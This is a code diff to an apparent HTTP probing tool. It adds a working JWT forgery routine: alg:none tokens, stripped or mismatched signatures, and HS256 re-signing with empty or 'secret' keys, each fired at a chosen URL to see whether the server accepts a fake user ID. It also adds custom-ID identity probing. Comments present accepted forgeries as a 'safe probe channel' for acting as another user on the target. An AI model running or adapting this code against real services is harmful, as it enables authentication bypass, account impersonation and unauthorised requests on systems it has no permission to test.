@@ -3,6 +3,7 @@ import { fetch as undiciFetch, Agent, request as undiciRequest } from "undici";
 import type { IncomingHttpHeaders } from "undici/types/header";
 import * as zlib from "node:zlib";
 import * as net from "node:net";
+import { createHmac } from "node:crypto";
 import { runRace, buildRawHttp1Request, connectSocket, writeAndDrain, readResponse } from "./probe-race.js";
 
 const probeRouter = Router();
@@ -719,7 +720,8 @@ async function runIdentityProbe(
   method: string,
   headers: Record<string, string>,
   body: string | null | undefined,
-  bodyField: string
+  bodyField: string,
+  extraBodyValues?: Array<number | string>
 ): Promise<unknown> {
   // ── 1. Find and decode JWT ─────────────────────────────────────────────────
   const isAuthKey = (k: string) =>
@@ -774,6 +776,11 @@ async function runIdentityProbe(
     { label: "zero", value: 0 },
     { label: "large fake", value: 9999999999 },
     { label: "string fake", value: "PROBE_FAKE" },
+    // User-supplied custom IDs
+    ...((extraBodyValues ?? []) as Array<number | string>).map(v => ({
+      label: `custom: ${v}`,
+      value: v,
+    })),
   ];
 
   const probeResults = [];
@@ -1053,6 +1060,182 @@ async function runSurrogateProbe(
   };
 }
 
+// ─── Technique: JWT Tamper Probe ──────────────────────────────────────────────
+// The goal: forge a JWT with a fake user ID so the server processes requests
+// against a nonexistent (or dummy) account, leaving the real account untouched.
+// Many servers decode JWTs but skip signature verification — this probe tests:
+//   a) alg:none  — completely unsigned JWT with fake sub
+//   b) orig_alg + fake payload + EMPTY sig  — header+payload intact, sig stripped
+//   c) orig_alg + fake payload + ORIG sig   — tests if server checks sig at all
+//   d) HS256 / key=""  — re-signed with empty string key
+//   e) HS256 / key="secret"  — common weak default
+// For each variant, the body UI field is also patched to the fake user ID.
+// Verdict: if ANY variant gets 2xx → server accepts unsigned/tampered JWTs → you
+// can probe with a completely fake identity that never touches your real account.
+async function runJwtTamperProbe(
+  url: string,
+  method: string,
+  headers: Record<string, string>,
+  body: string | null | undefined,
+  uiField: string,
+  fakeUserId: number
+): Promise<unknown> {
+  // ── Decode original JWT ────────────────────────────────────────────────────
+  const isAuthKey = (k: string) =>
+    k.toLowerCase() === "x-auth" || k.toLowerCase() === "authorization";
+  const authEntry = Object.entries(headers).find(([k]) => isAuthKey(k));
+  const authHeaderKey  = authEntry?.[0] ?? "x-auth";
+  const rawHeaderVal   = authEntry?.[1] ?? "";
+  const rawToken = rawHeaderVal.toLowerCase().startsWith("bearer ")
+    ? rawHeaderVal.slice(7)
+    : rawHeaderVal;
+
+  if (!rawToken) {
+    return { error: "No JWT found in request headers" };
+  }
+
+  const parts = rawToken.split(".");
+  if (parts.length !== 3) {
+    return { error: "Token does not look like a JWT (expected 3 parts)" };
+  }
+
+  let origHeader: Record<string, unknown>;
+  let origPayload: Record<string, unknown>;
+  try {
+    origHeader  = JSON.parse(Buffer.from(parts[0], "base64url").toString("utf-8"));
+    origPayload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf-8"));
+  } catch {
+    return { error: "Failed to decode JWT header or payload" };
+  }
+
+  // Build fake payload — change sub to a fake user ID while preserving other claims
+  const origSub   = String(origPayload.sub ?? "");
+  // If sub looks like "50/1736380225", replace only the numeric part after "/"
+  const fakeSub   = origSub.includes("/")
+    ? origSub.replace(/\d+$/, String(fakeUserId))
+    : String(fakeUserId);
+  const fakePayload = { ...origPayload, sub: fakeSub };
+
+  const encFakePayload = Buffer.from(JSON.stringify(fakePayload)).toString("base64url");
+  const encOrigHeader  = parts[0];
+  const origSig        = parts[2];
+
+  function makeNoneHeader() {
+    return Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
+  }
+  function signHS256(headerB64: string, payloadB64: string, key: string) {
+    return createHmac("sha256", key).update(`${headerB64}.${payloadB64}`).digest("base64url");
+  }
+
+  // Parse body to patch UI field
+  let baseObj: Record<string, unknown> = {};
+  try { if (body) baseObj = JSON.parse(body); } catch { /* ignore */ }
+  const patchedBody = JSON.stringify({ ...baseObj, [uiField]: fakeUserId });
+
+  const variants: Array<{ label: string; token: string; desc: string }> = [
+    {
+      label:  "alg:none — unsigned",
+      desc:   "JWT header changed to alg:none, fake sub, no signature. Classic JWT none attack.",
+      token:  `${makeNoneHeader()}.${encFakePayload}.`,
+    },
+    {
+      label:  "orig_alg + fake payload + NO sig",
+      desc:   "Original algorithm in header, fake sub in payload, signature stripped. Tests if server checks sig at all.",
+      token:  `${encOrigHeader}.${encFakePayload}.`,
+    },
+    {
+      label:  "orig_alg + fake payload + ORIG sig",
+      desc:   "Original algorithm and signature, but payload tampered (sub changed). If 2xx, server doesn't verify sig.",
+      token:  `${encOrigHeader}.${encFakePayload}.${origSig}`,
+    },
+    {
+      label:  `HS256 / key=""`,
+      desc:   `Fake payload re-signed with HS256 using empty string key.`,
+      token:  (() => {
+        const h = Buffer.from(JSON.stringify({ alg: "hs256", typ: "JWT" })).toString("base64url");
+        return `${h}.${encFakePayload}.${signHS256(h, encFakePayload, "")}`;
+      })(),
+    },
+    {
+      label:  `HS256 / key="secret"`,
+      desc:   `Fake payload re-signed with HS256 using common weak key "secret".`,
+      token:  (() => {
+        const h = Buffer.from(JSON.stringify({ alg: "hs256", typ: "JWT" })).toString("base64url");
+        return `${h}.${encFakePayload}.${signHS256(h, encFakePayload, "secret")}`;
+      })(),
+    },
+  ];
+
+  const results = [];
+  for (const v of variants) {
+    const tamperedHeaders = { ...headers, [authHeaderKey]: `Bearer ${v.token}` };
+    const t0 = Date.now();
+    try {
+      const resp = await undiciFetch(url, {
+        method,
+        headers: { ...tamperedHeaders, "Content-Type": "application/json" },
+        body: patchedBody,
+        // @ts-expect-error undici dispatcher
+        dispatcher: insecureAgent,
+        signal: AbortSignal.timeout(12_000),
+        redirect: "follow",
+      });
+      const responseHeaders: Record<string, string> = {};
+      resp.headers.forEach((v2, k) => { responseHeaders[k] = v2; });
+      const respText = await resp.text().catch(() => null);
+      const committed = resp.status >= 200 && resp.status < 300;
+      results.push({
+        label: v.label,
+        desc: v.desc,
+        fakeSub,
+        fakeUserId,
+        committed,
+        durationMs: Date.now() - t0,
+        status: resp.status,
+        statusText: resp.statusText || String(resp.status),
+        body: respText && respText.length > 4_000 ? respText.slice(0, 4_000) + "\n…truncated" : respText,
+        error: null,
+        note: committed
+          ? `🚨 2xx — server accepted tampered JWT with sub=${fakeSub}! Signature verification is NOT enforced. This is a safe probe channel: use any fake user ID.`
+          : `Rejected (${resp.status}) — server correctly refused this tampered token.`,
+      });
+    } catch (err: unknown) {
+      results.push({
+        label: v.label,
+        desc: v.desc,
+        fakeSub,
+        fakeUserId,
+        committed: false,
+        durationMs: Date.now() - t0,
+        status: 0,
+        statusText: "Error",
+        body: null,
+        error: err instanceof Error ? err.message : String(err),
+        note: "Network error",
+      });
+    }
+  }
+
+  const anyCommitted = results.some(r => r.committed);
+  const verdict = anyCommitted ? "signature_not_verified" : "signature_verified";
+  const verdictDetail = anyCommitted
+    ? `🚨 CRITICAL: Server accepted a tampered JWT (fake sub=${fakeSub}). ` +
+      `Signature verification is NOT enforced. You can probe with any fake user ID — ` +
+      `the server will process requests as if you are user ${fakeUserId} without touching your real account.`
+    : `✓ Server rejected all tampered tokens. JWT signature verification is enforced. ` +
+      `You cannot forge a JWT to probe safely via identity substitution.`;
+
+  return {
+    origSub,
+    fakeSub,
+    fakeUserId,
+    uiField,
+    verdict,
+    verdictDetail,
+    results,
+  };
+}
+
 // POST /api/proxy/probe
 probeRouter.post("/proxy/probe", async (req, res) => {
   const {
@@ -1129,7 +1312,16 @@ probeRouter.post("/proxy/probe", async (req, res) => {
         }
         case "idprobe": {
           const idBodyField: string = req.body.idBodyField ?? "UI";
-          output.idprobe = await runIdentityProbe(url, method, headers, body, idBodyField);
+          const idExtraValues: Array<number | string> = Array.isArray(req.body.idExtraValues)
+            ? req.body.idExtraValues
+            : [];
+          output.idprobe = await runIdentityProbe(url, method, headers, body, idBodyField, idExtraValues);
+          break;
+        }
+        case "jwtprobe": {
+          const jwtUiField: string = req.body.jwtUiField ?? "UI";
+          const jwtFakeUserId: number = Number(req.body.jwtFakeUserId ?? 99999999);
+          output.jwtprobe = await runJwtTamperProbe(url, method, headers, body, jwtUiField, jwtFakeUserId);
           break;
         }
         case "surrogateprobe": {
